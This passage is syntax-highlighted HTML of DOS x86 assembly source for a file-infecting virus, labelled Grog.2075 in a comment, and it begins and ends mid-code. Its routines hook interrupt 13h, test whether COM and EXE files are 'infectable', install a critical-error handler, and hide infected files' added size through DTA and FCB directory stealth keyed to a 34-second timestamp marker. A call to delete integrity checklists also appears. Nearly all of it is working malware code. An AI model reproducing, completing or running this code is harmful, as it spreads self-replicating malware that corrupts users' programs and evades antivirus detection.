         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_es_seg</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to test_es_seg</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">test_es_seg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; AX = extra segment</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Equal to extra segment?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_equal</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to not_equal</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">not_equal</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">       </span><span class="sc1">; Segment not found</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">exam_mod_reg</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Examine and prehaps modify register</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Equal to test register value?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_bx_reg</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to exam_bx_reg</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; AX = new register value</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">found_reg</span><span class="sc0">
</span><span class="sc5">exam_bx_reg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Equal to test register value?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_cx_reg</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to exam_cx_reg</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; BX = new register value</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">found_reg</span><span class="sc0">
</span><span class="sc5">exam_cx_reg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Equal to test register value?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_dx_reg</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to exam_dx_reg</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; CX = new register value</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">found_reg</span><span class="sc0">
</span><span class="sc5">exam_dx_reg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Equal to test register value?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_si_reg</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to exam_si_reg</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; DX = new register value</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">found_reg</span><span class="sc0">
</span><span class="sc5">exam_si_reg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Equal to test register value?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_di_reg</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to exam_di_reg</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; SI = new register value</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">found_reg</span><span class="sc0">
</span><span class="sc5">exam_di_reg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Equal to test register value?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_reg_end</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to exam_reg_end</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; DI = new register value</span><span class="sc0">
</span><span class="sc5">found_reg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; BP = found test register value</span><span class="sc0">
</span><span class="sc5">exam_reg_end</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">xchg_int13</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Exchange address of interrupt 13h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; Save segments at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Load segments from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">int13_addr</span><span class="sc0">   </span><span class="sc1">; SI = offset of int13_addr</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; Load offset of interrupt 13h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; Load segment of interrupt 13h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; SI = offset of interrupt vector 13h</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">int13_addr</span><span class="sc0">   </span><span class="sc1">; DI = offset of int13_addr</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; Get interrupt vector 13h</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">;  "      "       "     "</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; DI = offset of interrupt segment...</span><span class="sc0">

         </span><span class="sc6">std</span><span class="sc0">             </span><span class="sc1">; Set direction flag</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Set interrupt segment 13h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Set interrupt offset 13h</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; Save segments at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Load segments from stack (CS)</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">not_infectab</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">       </span><span class="sc1">; File not infectable</span><span class="sc0">
</span><span class="sc5">infectable</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">

</span><span class="sc5">examine_file</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Examine COM/EXE file</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">
</span><span class="sc5">find_zero</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; End of filename?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_zero</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to find_zero</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">      </span><span class="sc1">; SI = offset of extension</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">              </span><span class="sc1">; Found dot before the extension?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_infectab</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to not_infectab</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">com_or_exe</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; COM executable</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">com_executab</span><span class="sc0">     </span><span class="sc1">; DI = offset of com_executab</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">examine_name</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">prepare_loop</span><span class="sc0">    </span><span class="sc1">; COM executable? Jump to prepare_...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">com_or_exe</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">; EXE executable</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">exe_executab</span><span class="sc0">     </span><span class="sc1">; DI = offset of exe_executab</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">examine_name</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_infectab</span><span class="sc0">    </span><span class="sc1">; EXE executable? Jump to not_infe...</span><span class="sc0">
</span><span class="sc5">prepare_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">      </span><span class="sc1">; SI = offset of middle of filename</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">table_begin</span><span class="sc0">  </span><span class="sc1">; DI = offset of table_begin</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">table_end</span><span class="sc4">-</span><span class="sc5">table_begin</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">table_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">examine_name</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">not_infectab</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to not_infectab</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; DI = offset of the next four byt...</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">table_loop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; File infectable</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infectable</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">examine_name</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Examine filename</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Examine four bytes</span><span class="sc0">
</span><span class="sc5">examine_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01011111b</span><span class="sc0">    </span><span class="sc1">; Upcase character</span><span class="sc0">
         </span><span class="sc6">scasb</span><span class="sc0">           </span><span class="sc1">; Match found in examined filename?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_matching</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to not_matching</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">examine_loop</span><span class="sc0">
</span><span class="sc5">not_matching</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Match found in examined filename</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">int24_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 24h of Grog.2075</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save BP at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; BP = stack pointer</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">0000000000000001b</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Load BP from stack</span><span class="sc0">
</span><span class="sc5">int24_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">dta_stealth</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">del_chklist</span><span class="sc0">
</span><span class="sc5">dta_stealth_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">   </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack (flags)</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save BP at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; BP = stack pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store flags</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Load BP from stack</span><span class="sc0">

         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">dta_dont_ste</span><span class="sc0">    </span><span class="sc1">; Error? Jump to dta_dont_ste</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">      </span><span class="sc1">; Get disk transfer area address</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (ES)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; SI = offset of disk transfer area</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">      </span><span class="sc1">; SI = offset of file time</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = file time</span><span class="sc0">

         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00011111b</span><span class="sc0">    </span><span class="sc1">; AL = seconds of file time</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00010001b</span><span class="sc0">    </span><span class="sc1">; Infected (34 seconds)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">dta_dont_ste</span><span class="sc0">    </span><span class="sc1">; Not infected? Jump to dta_dont_ste</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">dta_dont_ste</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">   </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">fcb_stealth</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">del_chklist</span><span class="sc0">
</span><span class="sc5">fcb_stealth_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Match no found?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fcb_ste_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to fcb_ste_exit</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">      </span><span class="sc1">; Get current PSP address</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; ES = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Parent PSP equal to current PSP?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fcb_dont_ste</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to fcb_dont_ste</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; BX = offset of unopened FCB</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; AL = extended FCB</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">      </span><span class="sc1">; Get disk transfer area address</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Extended FCB?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_extended</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to not_extended</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">      </span><span class="sc1">; BX = offset of normal FCB</span><span class="sc0">
</span><span class="sc5">not_extended</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AX = file time</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000000011111b</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000000010001b</span><span class="sc0">
